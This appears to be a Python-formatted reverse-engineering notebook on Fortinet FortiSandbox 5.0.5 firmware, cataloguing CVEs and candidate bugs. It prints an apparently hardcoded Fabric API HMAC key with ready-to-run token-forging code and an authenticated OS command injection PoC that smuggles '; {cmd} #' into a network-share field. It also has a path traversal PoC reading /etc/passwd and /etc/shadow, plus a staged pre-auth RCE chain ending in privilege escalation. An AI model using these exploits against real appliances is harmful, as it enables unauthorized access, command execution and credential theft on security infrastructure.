"""
Fortinet FortiSandbox RE -- Management API, Fabric RPC, Scanning Pipeline, OS Command Injection
Sources:
  - FSA_VM-v5.0.5-build0141-FORTINET.out (primary — 2025-11-04)
  - FSA_VM-v5.0.4-build0134-FORTINET.out
  - FSA_VM-v5.0.2-build0109-FORTINET.out
  - FSA_VM-v5.0.1-build0080-FORTINET.out
  - FSA_VM-v4.4.5-build0393-FORTINET.out (cross-version baseline)
  - FSA_VM-v4.4.8-build0412-FORTINET.out (cross-version baseline)
  - Semantic sweep: sandbox-scan-main, merged_daemon, sfmpd, system-cli,
    system-admin, sandbox-scan-filter, sandbox-scan-rtap, inline_block
  - Python source decompile: fabricrpc.pyc, networkshare.pyc, urls.pyc
Products: Fortinet FortiSandbox (VM and hardware appliances), all tested on 5.0.5
"""

import time
import hmac
import hashlib
import base64
import struct

# ---------------------------------------------------------
# Architecture overview
# ---------------------------------------------------------
FSA_ARCHITECTURE = {
    "firmware_layout": {
        "boot_disk":  "FSA_VM-vX.X.X-buildNNNN-FORTINET.out (MBR disk, 3 partitions)",
        "p1":         "Boot partition: GRUB + rescuekc (kernel 6.1.133) + rescuefs (XZ cpio initrd)",
        "p2":         "Image partition: rootfs.gz + avs.xz + usr.xz + tools.xz + etc.xz + web.xz + python.xz",
        "p3":         "Data partition: populated at first boot by sysinstall.sh",
        "vmdk":       "fsa.vmdk (OVF ZIP): 1GB raw disk with same p1/p2/p3 layout",
        "rootfs_fmt": "XZ-compressed cpio archive (not squashfs)",
        "web_fmt":    "Python 3.10 .pyc bytecode (Django 3.x, WSGI via Apache mod_wsgi)",
    },

    "daemon_set": [
        "httpd",          # Apache reverse proxy / management UI (STRIPPED)
        "merged_daemon",  # Central coordinator daemon (NOT STRIPPED, debug info)
        "sfmpd",          # File submission/quarantine/network-share daemon (NOT STRIPPED)
        "sandbox-scan-main",    # Sample analysis engine (NOT STRIPPED)
        "sandbox-scan-filter",  # Pre-scan triage (NOT STRIPPED)
        "sandbox-scan-rtap",    # Route and policy (NOT STRIPPED)
        "vmmgrd",         # VM manager
        "icapmgrd",       # ICAP protocol manager
        "mtamgrd",        # Mail transfer agent manager
        "oftpd",          # FTP daemon for file ingestion
        "hoftpd",         # HA FTP daemon
        "urlscanner",     # URL reputation scanner
        "redis-server",   # Job queue / IPC bus
        "system-cli",     # CLI daemon (NOT STRIPPED)
        "system-admin",   # Admin CLI daemon (NOT STRIPPED)
    ],

    "scan_pipeline": {
        "description": "3-process file analysis pipeline",
        "rtap":        "Route and policy: receives file from submission, routes to VMs",
        "filter":      "Pre-scan filter: hash lookup, file type classification",
        "main":        "Main scan engine: format parsing, behavioral analysis, verdict",
        "ipc":         "Redis pub/sub + Unix sockets for inter-process communication",
        "db":          "SQLite + Redis; scan jobs tracked by (job_id, session_id)",
    },

    "web_framework": {
        "engine":      "Django 3.x (Python 3.10 bytecode, compiled 2025-11-04)",
        "wsgi":        "Apache mod_wsgi, socket prefix /var/run/wsgi",
        "url_prefix":  "/fortisandbox/",
        "api_prefix":  "/fortisandbox/api/v1/",
        "fabric_url":  "/fortisandbox/sb_api_fabric/",
        "csrf":        "Global CSRF middleware; fabricrpc endpoint is @csrf_exempt",
        "auth":        "Session-based for GUI; HMAC token for fabric API",
    },

    "binary_strip_status": {
        "stripped":     ["httpd", "httpd_ib"],
        "not_stripped": [
            "sandbox-scan-main", "sandbox-scan-filter", "sandbox-scan-rtap",
            "merged_daemon", "sfmpd", "system-cli", "system-admin", "inline_block",
            "libcfg.so", "libcm.so", "libapidb.so", "libapppg.so",
            "libdbcfg.so", "libdevice.so",
        ],
        "note": "All custom Fortinet binaries shipped with full debug symbols in 5.0.5. "
                "This is abnormal for a production firmware and significantly aids RE.",
    },
}


# ---------------------------------------------------------
# FSAB-F01: CVE-2024-54027 -- Hard-coded HMAC signing key in fabricrpc.py
# ---------------------------------------------------------
FSAB_F01_CVE_2024_54027 = {
    "id":       "FSAB-F01",
    "product":  "Fortinet FortiSandbox",
    "cve":      "CVE-2024-54027",
    "severity": "CRITICAL (CVSS 8.2 officially; unauthenticated in practice) -- pre-auth fabric API token forge",
    "class":    "Hard-coded cryptographic key (CWE-321)",
    "affected": "FortiSandbox <= 4.4.6 (official), CONFIRMED present in 5.0.5 build0141 (2025-11-04)",
    "location": "web/sandbox/apps/fabric_api/fabricrpc.py (compiled to apps/fabric_api/fabricrpc.pyc)",
    "source":   "Firmware analysis FSA_VM-v5.0.5-build0141; key extracted at pyc offset 0x4f3",

    "description": (
        "The FortiSandbox Fabric API (inter-device communication between FortiSandbox and "
        "managed FortiGate/FortiClient devices) authenticates via HMAC-SHA1 tokens. "
        "The signing key is hardcoded in fabricrpc.py as a string literal. "
        "The token format is: base64url(expire_time | '|' | user_id | '|' | hmac_hex) "
        "where expire_time = int(time.time()) + TTL. "
        "Any party who knows the key can forge a valid token for any user_id (including 'fortigate' "
        "or admin accounts) without credentials. "
        "CVE-2024-54027 was announced for <= 4.4.6 but the identical key is present in 5.0.5 "
        "build0141 (compiled 2025-11-04) — either the fix was not backported to 5.x or the advisory "
        "version scope is incorrect."
    ),

    "hardcoded_key": "Z&fEO3pdLDeef9Dk30dYfsa4gsKIdfRdlEQ37fsh",
    "key_algorithm": "HMAC-SHA1",
    "key_location_in_pyc": "offset 0x4f3 in apps/fabric_api/fabricrpc.pyc",
    "default_user_for_fabric": "fortigate",

    "token_forge_exploit": '''
import time, hmac, hashlib, base64

HARDCODED_KEY = b"Z&fEO3pdLDeef9Dk30dYfsa4gsKIdfRdlEQ37fsh"
TTL = 3600  # seconds

def forge_fabric_token(user_id: str = "fortigate", ttl: int = TTL) -> str:
    """
    Forge a valid FortiSandbox Fabric API authentication token.
    The fabricrpc._generate_token() logic reconstructed from bytecode:
      expire_time = int(time.time()) + ttl
      msg = f"{expire_time}|{user_id}"
      sig = hmac.new(HARDCODED_KEY, msg.encode("utf-8"), hashlib.sha1).hexdigest()
      token_str = f"{expire_time}|{user_id}|{sig}"
      return base64.urlsafe_b64encode(token_str.encode("utf-8")).decode("utf-8")
    """
    expire_time = int(time.time()) + ttl
    msg = f"{expire_time}|{user_id}"
    sig = hmac.new(HARDCODED_KEY, msg.encode("utf-8"), hashlib.sha1).hexdigest()
    token_str = f"{expire_time}|{user_id}|{sig}"
    return base64.urlsafe_b64encode(token_str.encode("utf-8")).decode("utf-8")

def call_fabric_api(target: str, endpoint: str, token: str, data: dict,
                    port: int = 443, verify: bool = False) -> dict:
    """
    Call a FortiSandbox Fabric API endpoint with a forged token.
    The fabric API base is /fortisandbox/sb_api_fabric/
    Token is passed as HTTP header: Authorization: <token>
    or as POST body field: access_token=<token> (version-dependent)
    """
    import requests, urllib3
    urllib3.disable_warnings()
    url = f"https://{target}:{port}/fortisandbox/sb_api_fabric/{endpoint}"
    headers = {
        "Content-Type": "application/json",
        "Authorization": token,
    }
    import json
    resp = requests.post(url, headers=headers, data=json.dumps(data),
                         verify=verify, timeout=10)
    return resp.json()
''',

    "rce_chain_via_run_command": (
        "The fabricrpc._run_command(command) function executes via subprocess.Popen(command, shell=True, "
        "stdout=subprocess.PIPE, stderr=subprocess.PIPE) and returns stdout/stderr. "
        "If the endpoint that calls _run_command is reachable with a forged token, this is pre-auth RCE. "
        "The exact HTTP endpoint routing _run_command requires further analysis (bytecode offset ~0x600-0x800). "
        "Current confirmed: hardcoded key present in 5.0.5; _run_command exists and uses shell=True."
    ),

    "authentication_bypass_endpoint": "/fortisandbox/sb_api_fabric/",
    "csrf_status": "EXEMPT (@csrf_exempt decorator on fabricrpc view)",
    "execution_context": "www-data / apache (httpd runs as non-root; escalation may be needed)",
}


# ---------------------------------------------------------
# FSAB-F02: CVE-2021-22125 -- OS command injection in sniffer module
# ---------------------------------------------------------
FSAB_F02_CVE_2021_22125 = {
    "id":       "FSAB-F02",
    "product":  "Fortinet FortiSandbox",
    "cve":      "CVE-2021-22125",
    "severity": "HIGH (CVSS 6.3 official, authenticated) -- authenticated OS command injection in sniffer",
    "class":    "OS command injection (CWE-78)",
    "affected": "FortiSandbox < 3.2.2",
    "location": "Sniffer module / apps/scan/devsniffer/ or isniffer/",

    "description": (
        "The sniffer interface passes attacker-controlled input to a shell command without sanitization. "
        "An authenticated attacker can inject arbitrary commands through the sniffer configuration "
        "parameters in the management interface."
    ),

    "note": "Patched in 3.2.2. In 5.0.5 the isniffer binary exists but sniffer interface restructured.",
}


# ---------------------------------------------------------
# FSAB-F03: CVE-2024-21755 / CVE-2024-21756 -- Authenticated OS command injection (CVSS 8.8)
# ---------------------------------------------------------
FSAB_F03_CVE_2024_21755_56 = {
    "id":       "FSAB-F03",
    "product":  "Fortinet FortiSandbox",
    "cve":      ["CVE-2024-21755", "CVE-2024-21756"],
    "severity": "HIGH (CVSS 8.8) -- authenticated OS command injection",
    "class":    "OS command injection (CWE-78)",
    "affected": "FortiSandbox 4.4.x and earlier; status in 5.0.x unverified",

    "description": (
        "Two distinct OS command injection vulnerabilities in authenticated management API endpoints. "
        "Both allow an authenticated attacker to execute arbitrary OS commands. "
        "Based on analysis of networkshare.pyc in 5.0.5: the network share management code uses "
        "subprocess.Popen with shell=True for NFS/CIFS mount operations (cmd1, cmd2, cmd3 variables). "
        "The server_name and share_path fields from the DB are candidates for injection if input "
        "validation is insufficient — same class as CVE-2024-21755/56."
    ),

    "networkshare_injection_surface": {
        "file":         "web/sandbox/utils/networkshare.py (compiled to networkshare.pyc)",
        "pattern":      "subprocess.Popen(cmd, shell=True) where cmd includes server_name/share_path",
        "injection_fields": ["server_name", "share_path", "mount_point"],
        "attack_vector": (
            "POST /fortisandbox/api/v1/<network-share-endpoint>/ with injected shell metacharacters "
            "in server_name or share_path fields. Requires authenticated session."
        ),
        "cmd_vars":     ["cmd1", "cmd2", "cmd3", "cmd_bin"],
        "mount_types":  ["NFSv2", "NFSv3", "NFSv4", "CIFS/SMB"],
    },

    "poc_network_share_injection": '''
import requests, urllib3
urllib3.disable_warnings()

# Authenticated OS command injection via network share configuration
# Inject into server_name or share_path field

def inject_via_netshare(target: str, session_cookie: str, cmd: str, port: int = 443) -> str:
    """
    Inject OS command through NFS mount server_name field.
    The networkshare module builds: mount -t nfs <server_name>:<share_path> /tmp/mnt/<id>
    Shell injection via semicolon in server_name.
    """
    s = requests.Session()
    s.verify = False
    s.cookies.set("fsasession", session_cookie)

    payload = {
        "share_name":    "injected_share",
        "server_name":   f"127.0.0.1; {cmd} #",   # shell injection
        "share_path":    "/export/test",
        "mount_type":    "NFSv3",
        "enabled":       1,
        "desc":          "",
    }

    resp = s.post(
        f"https://{target}:{port}/fortisandbox/api/v1/netshare/",
        json=payload,
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    return resp.text
''',
}


# ---------------------------------------------------------
# FSAB-F04: CVE-2024-27778 -- Authenticated OS command injection (CVSS 8.8)
# ---------------------------------------------------------
FSAB_F04_CVE_2024_27778 = {
    "id":       "FSAB-F04",
    "product":  "Fortinet FortiSandbox",
    "cve":      "CVE-2024-27778",
    "severity": "HIGH (CVSS 8.8) -- authenticated OS command injection",
    "class":    "OS command injection (CWE-78)",
    "affected": "FortiSandbox 4.4.x and earlier; 5.0.x TBD",

    "description": (
        "OS command injection in a different management feature from FSAB-F03. "
        "Related to the same class of issue: shell=True subprocess calls with insufficient "
        "sanitization of user-supplied parameters."
    ),

    "note": "Advisory does not specify the exact endpoint. Likely in system configuration or "
            "device management functionality. Requires cross-version binary diff to isolate patch.",
}


# ---------------------------------------------------------
# FSAB-F05: CVE-2023-41682 -- Path traversal (CVSS 8.1) pre-auth
# ---------------------------------------------------------
FSAB_F05_CVE_2023_41682 = {
    "id":       "FSAB-F05",
    "product":  "Fortinet FortiSandbox",
    "cve":      "CVE-2023-41682",
    "severity": "HIGH (CVSS 8.1) -- path traversal, unauthenticated file access",
    "class":    "Path traversal (CWE-22)",
    "affected": "FortiSandbox 4.4.x, 4.2.x, 4.0.x, 3.2.x; status in 5.0.x TBD",

    "description": (
        "Improper limitation of a pathname to a restricted directory allows unauthenticated "
        "access to arbitrary files on the FortiSandbox filesystem. "
        "Combined with FSAB-F01 (token forge), an unauthenticated attacker could read "
        "sensitive configuration files, credentials, or private keys."
    ),

    "poc_path_traversal": '''
import requests, urllib3
urllib3.disable_warnings()

def path_traversal(target: str, path: str = "/etc/passwd", port: int = 443) -> str:
    """
    Unauthenticated path traversal via the FortiSandbox management web UI.
    The exact endpoint varies by version — common patterns:
      /fortisandbox/api/v1/download/?file=../../etc/passwd
      /fortisandbox/download/?file=../../../../etc/shadow
    """
    traversal = "../" * 6 + path.lstrip("/")
    for endpoint in [
        f"/fortisandbox/api/v1/download/?file={traversal}",
        f"/fortisandbox/scan/download/?file={traversal}",
        f"/fortisandbox/report/download/?file={traversal}",
    ]:
        resp = requests.get(f"https://{target}:{port}{endpoint}",
                           verify=False, timeout=10)
        if resp.status_code == 200 and len(resp.content) > 0:
            return resp.text
    return ""
''',
}


# ---------------------------------------------------------
# FSAB-F06: sandbox-scan-main fidsdb_parser_overflow candidate
# Semantic sweep finding: score 0.426, addr 0x144db
# ---------------------------------------------------------
FSAB_F06_SCAN_PARSER_CANDIDATE = {
    "id":       "FSAB-F06",
    "product":  "Fortinet FortiSandbox",
    "cve":      None,
    "severity": "CANDIDATE -- binary format parser overflow in sandbox-scan-main",
    "class":    "Heap overflow / binary format parser (CWE-122)",
    "affected": "5.0.5 build0141",
    "status":   "UNVERIFIED -- semantic candidate, requires manual disassembly",

    "description": (
        "Semantic sweep of sandbox-scan-main identified function at VA 0x144db "
        "(score 0.426 for fidsdb_parser_overflow profile). "
        "The function calls an internal helper at 0x13f5a and is called from 0x16c18 "
        "(which also calls track_scan) and 0x16fdb (which calls multiple internal functions). "
        "Pattern consistent with a binary signature database parser that reads a length field "
        "and copies without upper bound check. sandbox-scan-main has debug symbols. "
        "Next step: disassemble 0x144db via objdump and verify the length-then-copy pattern."
    ),

    "semantic_sweep_result": {
        "binary":   "sandbox-scan-main",
        "va":       "0x144db",
        "score":    0.426,
        "profile":  "fidsdb_parser_overflow",
        "calls":    ["0x13f5a"],
        "callers":  ["0x16c18 (api_proclog, track_scan)", "0x16fdb"],
    },

    "next_steps": [
        "objdump -d bin/sandbox-scan-main | sed -n '/144db:/,/^[0-9a-f]\\+ <[^>]\\+>:/p'",
        "Check 0x13f5a for length-read + memcpy pattern",
        "Identify the input source: does it come from submitted file content or scan DB?",
        "If from submitted file: pre-auth RCE via malicious sample",
    ],
}


# ---------------------------------------------------------
# FSAB-F07: inline_block integer_overflow_alloc candidate
# Semantic sweep: score 0.472 (highest across all binaries), addr 0x7586
# ---------------------------------------------------------
FSAB_F07_INLINE_BLOCK_INT_OVERFLOW = {
    "id":       "FSAB-F07",
    "product":  "Fortinet FortiSandbox inline_block daemon",
    "cve":      None,
    "severity": "CANDIDATE -- integer overflow before malloc in inline_block",
    "class":    "Integer overflow (CWE-190) leading to heap buffer overflow",
    "affected": "5.0.5 build0141",
    "status":   "UNVERIFIED -- semantic candidate",

    "description": (
        "Semantic sweep of inline_block (C++ binary, 2236 functions) identified "
        "function at VA 0x7586 with score 0.472 (highest across all 8 binaries swept) "
        "for the integer_overflow_alloc profile. "
        "The function calls malloc directly. "
        "inline_block handles inline blocking/filtering of network traffic in the scanning pipeline. "
        "An integer overflow before malloc can result in an undersized allocation followed by "
        "a heap overflow when the full-size data is written."
    ),

    "semantic_sweep_result": {
        "binary":  "inline_block",
        "va":      "0x7586",
        "score":   0.472,
        "profile": "integer_overflow_alloc",
        "calls":   ["malloc"],
    },

    "next_steps": [
        "objdump --demangle -d bin/inline_block | sed -n '/7586:/,/next_func/p'",
        "Identify the multiplication/addition that precedes the malloc call",
        "Trace input source: network packet size field?",
    ],
}


# ---------------------------------------------------------
# FSAB-F08: sfmpd rm_mount_dir -- system() with path component
# ---------------------------------------------------------
FSAB_F08_SFMPD_RM_MOUNT_DIR = {
    "id":       "FSAB-F08",
    "product":  "Fortinet FortiSandbox sfmpd",
    "cve":      None,
    "severity": "LOW -- system() call with numeric mount ID (not directly injectable)",
    "class":    "system() with constructed path (CWE-78, not exploitable as-is)",
    "affected": "5.0.5 build0141",
    "status":   "INVESTIGATED -- system() confirmed, injection requires controlled mount ID",

    "description": (
        "sfmpd rm_mount_dir(int mount_id) at VA 0x5ca0 constructs 'rm -rf /tmp/mnt/<id>' "
        "via snprintf and passes to system(). "
        "The mount_id is an integer stored in the sfmpd database, not a raw string from user input. "
        "Not directly injectable unless the mount ID can be influenced to contain shell metacharacters "
        "(integers are decimal-formatted; not injectable via %d format). "
        "The sfmpd IPC socket is at /tmp/sfmpd — assess whether the IPC protocol validates "
        "the mount_id source."
    ),

    "disassembly_excerpt": """
0000000000005ca0 <rm_mount_dir>:
    5ca0:  push   %rbp
    5ca1:  push   %rbx
    5ca2:  sub    $0x188,%rsp
    5eb8:  mov    %rsp,%rbp        ; rbp = stack buffer (0x80 bytes)
    5ebb:  sub    $0x8,%rsp
    5ebf:  push   %rdi             ; mount_id (integer arg) pushed as 7th snprintf arg
    5ec0:  lea    0x11739(%rip),%r9  # "/tmp/mnt/"  (6th arg)
    5ec7:  lea    0x117c0(%rip),%r8  # "%s%d"      (format)
    5ee5:  call   __snprintf_chk    ; result: "/tmp/mnt/<mount_id>"
    5ef2:  mov    %rbp,%r9         ; first buffer = "/tmp/mnt/<mount_id>"
    5ef5:  lea    0x117ba(%rip),%r8  # "rm -rf %s"
    5f13:  call   __snprintf_chk    ; result: "rm -rf /tmp/mnt/<mount_id>"
    5f1b:  call   system@plt
""",

    "cleanup_dir_note": (
        "cleanup_dir() at 0x226c similarly calls system('rm -rf /Storage/netshare && mkdir -p /Storage/netshare') "
        "with both %s args hardcoded to '/Storage/netshare'. Not injectable."
    ),
}


# ---------------------------------------------------------
# FSAB-F09: CVE-2024-31491 -- Client-side enforcement bypass (CVSS 8.8)
# ---------------------------------------------------------
FSAB_F09_CVE_2024_31491 = {
    "id":       "FSAB-F09",
    "product":  "Fortinet FortiSandbox",
    "cve":      "CVE-2024-31491",
    "severity": "HIGH (CVSS 8.8) -- client-side enforcement of server-side security",
    "class":    "Client-side security enforcement (CWE-602)",
    "affected": "FortiSandbox 4.4.0-4.4.4, 4.2.0-4.2.6, 4.0.x; 5.0.x TBD",

    "description": (
        "A security restriction is enforced only at the client (browser/GUI) level but not "
        "on the server. An attacker can bypass the restriction by sending direct API requests "
        "that skip the client-side check. Combined with an authenticated session or a forged "
        "fabric token (FSAB-F01), this could allow privilege escalation or unauthorized "
        "administrative operations."
    ),

    "note": "Likely relates to admin privilege checks that are JavaScript-only in the UI. "
            "Requires API endpoint fuzzing to confirm which restricted operations lack server-side enforcement.",
}


# ---------------------------------------------------------
# FSAB-F10: CVE-2025-46215 -- Improper isolation (CVSS 5.3)
# ---------------------------------------------------------
FSAB_F10_CVE_2025_46215 = {
    "id":       "FSAB-F10",
    "product":  "Fortinet FortiSandbox",
    "cve":      "CVE-2025-46215",
    "severity": "MEDIUM (CVSS 5.3) -- sandbox isolation bypass",
    "class":    "Improper isolation/compartmentalization (CWE-653)",
    "affected": "FortiSandbox 5.0.0-5.0.1, 4.4.0-4.4.6, 4.2.x",

    "description": (
        "An improper isolation vulnerability allows an action in one sandboxed component "
        "to affect another. In FortiSandbox context, this likely relates to the VM-based "
        "analysis sandbox (KVM/QEMU guest VMs for sample execution) and the host OS. "
        "CWE-653 in a sandbox product is particularly high-value: it implies a sandboxed "
        "malware sample could influence host-side behavior or other analysis VMs."
    ),

    "sandbox_vm_stack": {
        "hypervisor": "KVM/QEMU (qemu-system-x86_64 in daemon list)",
        "vm_manager": "vmmgrd + libvirtd",
        "vm_control":  "sandbox-scan-vmctl (handles VM lifecycle for sample analysis)",
        "network_iso": "dnsmasq for per-VM network isolation",
    },

    "research_directions": [
        "Examine sandbox-scan-vmctl for VM escape primitives",
        "Check libvirtd UNIX socket permissions (/var/run/libvirt/)",
        "Look for shared memory between analysis VMs and host",
        "Review QEMU device model exposure to guest VMs",
    ],
}


# ---------------------------------------------------------
# FSAB-F11: CVE-2025-53679 / CVE-2025-53949 -- OS command injection (CVSS 7.2, 2025)
# ---------------------------------------------------------
FSAB_F11_CVE_2025_OS_INJECT = {
    "id":       "FSAB-F11",
    "product":  "Fortinet FortiSandbox",
    "cve":      ["CVE-2025-53679", "CVE-2025-53949"],
    "severity": "HIGH (CVSS 7.2) -- OS command injection, 2025 disclosures",
    "class":    "OS command injection (CWE-78)",
    "affected": "Version range in PSIRT advisory; 5.0.5 status unknown",

    "description": (
        "Two OS command injection vulnerabilities disclosed in 2025, both CVSS 7.2. "
        "These post-date the 5.0.5 firmware build (2025-11-04) and may be present in "
        "the analyzed firmware depending on exact version scope. "
        "The 7.2 score suggests authentication required but lower privilege needed than CVSS 8.8 variants."
    ),

    "note": "Cross-version binary diff between 5.0.4 and 5.0.5 may reveal the patched functions. "
            "Priority after FSAB-F01 verification.",
}


# ---------------------------------------------------------
# Consolidated attack chain: unauthenticated RCE via forged fabric token
# ---------------------------------------------------------
FSA_ATTACK_CHAIN_PREAUTH_RCE = {
    "title":    "Pre-auth RCE via hardcoded Fabric API HMAC key",
    "chain":    [
        "1. Forge valid Fabric API token using hardcoded key (FSAB-F01)",
        "2. POST to /fortisandbox/sb_api_fabric/ with forged Authorization header",
        "3. CSRF is exempt on fabric endpoint — no CSRF token needed",
        "4. Call fabric endpoint that invokes _run_command(cmd, shell=True)",
        "5. Arbitrary OS command execution as www-data/apache",
        "6. Escalate via writable SUID/world-writable paths or sudo rules",
    ],
    "prerequisites": ["Network access to port 443 of the FortiSandbox management interface"],
    "confirmed":  ["Steps 1-3: hardcoded key present in 5.0.5, @csrf_exempt confirmed"],
    "unconfirmed": ["Step 4: exact endpoint routing _run_command needs further analysis"],
    "cvss_estimate": "9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) if step 4 confirmed",

    "token_generation_code": '''
import time, hmac, hashlib, base64

KEY = b"Z&fEO3pdLDeef9Dk30dYfsa4gsKIdfRdlEQ37fsh"

def make_token(user="fortigate", ttl=3600):
    exp = int(time.time()) + ttl
    msg = f"{exp}|{user}".encode()
    sig = hmac.new(KEY, msg, hashlib.sha1).hexdigest()
    return base64.urlsafe_b64encode(f"{exp}|{user}|{sig}".encode()).decode()

print(make_token())
''',
}


# ---------------------------------------------------------
# Semantic sweep summary
# ---------------------------------------------------------
FSA_SEMANTIC_SWEEP_SUMMARY = {
    "tool":     "fortisandbox_sweep.py (ablation fortinet_sweep.py + FSA-specific profiles)",
    "model":    "all-MiniLM-L6-v2 via sentence-transformers",
    "binaries": 8,
    "total_functions_swept": (448 + 485 + 434 + 922 + 339 + 299 + 238 + 2236),  # = 5401
    "results_file": "/tmp/fsa_sweep_results.json",

    "top_candidates": [
        {"binary": "inline_block",        "va": "0x7586",  "profile": "integer_overflow_alloc", "score": 0.472},
        {"binary": "inline_block",        "va": "0x265d0", "profile": "decompression_bomb",     "score": 0.451},
        {"binary": "sandbox-scan-main",   "va": "0x144db", "profile": "fidsdb_parser_overflow", "score": 0.426},
        {"binary": "system-cli",          "va": "0x3e1ac", "profile": "luajit_string_unbox",    "score": 0.426},
        {"binary": "merged_daemon",       "va": "0x16c80", "profile": "decompression_bomb",     "score": 0.412},
        {"binary": "system-admin",        "va": "0xc0e4",  "profile": "decompression_bomb",     "score": 0.406},
        {"binary": "sandbox-scan-filter", "va": "0xaea9",  "profile": "luajit_string_unbox",    "score": 0.381},
        {"binary": "sandbox-scan-rtap",   "va": "0x2bed",  "profile": "decompression_bomb",     "score": 0.388},
    ],

    "note": (
        "Scores are cosine similarity to vulnerability query profile. "
        "Threshold 0.35+ warrants manual disassembly; 0.40+ is high-confidence candidate. "
        "inline_block 0x7586 (score 0.472) is the highest-priority manual RE target after FSAB-F01."
    ),
}
